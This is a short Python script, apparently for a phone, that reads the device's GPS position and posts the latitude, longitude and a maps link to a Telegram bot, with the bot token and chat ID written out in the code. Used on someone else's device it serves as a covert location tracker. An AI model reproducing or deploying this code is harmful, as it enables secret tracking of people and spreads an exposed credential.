import location, requests, time

# GPS le lo
location.start_updating()
time.sleep(2)
loc = location.get_location()
location.stop_updating()

# Telegram bhejo
requests.post(
    f"https://api.telegram.org/bot8438796872:AAEtrjfPgsjIEYjRdjWnJRkfqu6CGC4KQxk/sendMessage",
    json={
        'chat_id': '7628413315',
        'text': f"📍 Location:\nLat: {loc.latitude}\nLon: {loc.longitude}\nhttps://maps.google.com/?q={loc.latitude},{loc.longitude}"
    }
)

print("✅ Location sent successfully ￼!")